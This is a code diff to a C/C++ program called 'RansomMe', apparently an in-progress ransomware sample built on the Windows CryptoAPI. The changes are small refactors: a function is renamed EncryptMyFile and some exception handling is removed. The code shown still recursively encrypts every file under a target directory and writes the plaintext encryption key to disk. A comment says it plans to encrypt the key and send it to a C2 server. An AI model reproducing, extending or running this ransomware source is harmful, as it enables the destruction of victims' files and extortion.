@@ -24,7 +24,7 @@ void PrintKey(HCRYPTPROV hCryptProv, HCRYPTKEY hKey) {
     DWORD keyBlobSize = 0;
     BYTE* keyBlob = NULL;
     FILE* file = NULL;
-    const char* fileName("C:\\Users\\Tamariz\\source\\repos\\RansomMe\\x64\\Debug\\key.bin");
+    const char* fileName = "C:\\Users\\Tamariz\\source\\repos\\RansomMe\\x64\\Debug\\key.bin";
 
     // Get the size of the key blob
     if (!CryptExportKey(hKey, 0, PLAINTEXTKEYBLOB, 0, NULL, &keyBlobSize)) {
@@ -67,11 +67,11 @@ void PrintKey(HCRYPTPROV hCryptProv, HCRYPTKEY hKey) {
 }
 
 
-BOOL EncryptFile(const char* inputFileName, const char* cryptoFileExt, HCRYPTKEY hKey) {
+BOOL EncryptMyFile(const char* inputFileName, const char* cryptoFileExt, HCRYPTKEY hKey) {
     HANDLE hInputFile = INVALID_HANDLE_VALUE;       // input file handler
     HANDLE hOutputFile = INVALID_HANDLE_VALUE;      // output file handler
 
-    BYTE buffer[CHUNK_SIZE] = {};                        // buffer to read from file, encrypt and write into file
+    BYTE buffer[CHUNK_SIZE];                        // buffer to read from file, encrypt and write into file
     DWORD bytesRead = 0, bytesWritten = 0;          // number of bytes read/written return by CreateFile and CryptEncrypt
     BOOL finalChunk = FALSE;                        // flag to tell CryptEncrypt that it is the final chunk (smaller than the rest)
     BOOL success = FALSE;                           // flag to return success/failure
@@ -103,29 +103,15 @@ BOOL EncryptFile(const char* inputFileName, const char* cryptoFileExt, HCRYPTKEY
     while (ReadFile(hInputFile, buffer, CHUNK_SIZE, &bytesRead, NULL) && bytesRead > 0) {
         finalChunk = (bytesRead < CHUNK_SIZE);  // the final chunk will be smaller thant CHUNK_SIZE
 
-        try {
             // Encrypt the chunk
-            if (!CryptEncrypt(hKey, 0, finalChunk, 0, buffer, &bytesRead, CHUNK_SIZE)) {
-                printf("Error: CryptEncrypt failed. Error Code: %lu\n", GetLastError());
-                printf("Failure encrypting file %s\n", inputFileName);
-                goto cleanup;
-            }
-        }
-        catch (...) {
+        if (!CryptEncrypt(hKey, 0, finalChunk, 0, buffer, &bytesRead, CHUNK_SIZE)) {
             printf("Error: CryptEncrypt failed. Error Code: %lu\n", GetLastError());
             printf("Failure encrypting file %s\n", inputFileName);
             goto cleanup;
         }
 
-        try {
-            // Write the encrypted chunk to the output file
-            if (!WriteFile(hOutputFile, buffer, bytesRead, &bytesWritten, NULL) || bytesWritten != bytesRead) {
-                printf("Error: WriteFile failed. Error Code: %lu\n", GetLastError());
-                printf("Failure writing to file %s\n", outputFileName);
-                goto cleanup;
-            }
-        }
-        catch (...) {
+        // Write the encrypted chunk to the output file
+        if (!WriteFile(hOutputFile, buffer, bytesRead, &bytesWritten, NULL) || bytesWritten != bytesRead) {
             printf("Error: WriteFile failed. Error Code: %lu\n", GetLastError());
             printf("Failure writing to file %s\n", outputFileName);
             goto cleanup;
@@ -156,7 +142,7 @@ size_t EncryptAllFiles(char* targetDir, const char* cryptoFileExt, HCRYPTKEY hKe
     size_t fileCount = 0;                    // number of files found
     char targetSubDir[MAX_PATH] = "";        // temporary variable to store the subdir
     char findTargetDir[MAX_PATH] = "";       // just to add an asterisk to the end of the targetDir but without affecting the original string
-    char fullFileName[MAX_PATH] = "";        // the full file name with path to pass to EncryptFile
+    char fullFileName[MAX_PATH] = "";        // the full file name with path to pass to EncryptMyFile
 
     // if targetDir does not end with \ we will add it as it will be more convinient later
     if (targetDir[strlen(targetDir)] != '\\') {
@@ -206,7 +192,7 @@ size_t EncryptAllFiles(char* targetDir, const char* cryptoFileExt, HCRYPTKEY hKe
                 continue;
             }
             // now encrypt the file
-            if (EncryptFile(fullFileName, cryptoFileExt, hKey)) {
+            if (EncryptMyFile(fullFileName, cryptoFileExt, hKey)) {
                 fileCount++;        // let's count the number of encrypted files, why not?
             }
         }
@@ -254,7 +240,7 @@ int main() {
 
         // print the key to a file (this will change to encrypt the key and send it to a C2 server
     PrintKey(hCryptProv, hKey);
-    //    EncryptFile(inputFileName, cryptoFileExt, hKey);
+    //    EncryptMyFile(inputFileName, cryptoFileExt, hKey);
         // encrypt a file
     fileNumber = EncryptAllFiles(targetDir, cryptoFileExt, hKey);
     printf("%zd files encrypted.\n", fileNumber);
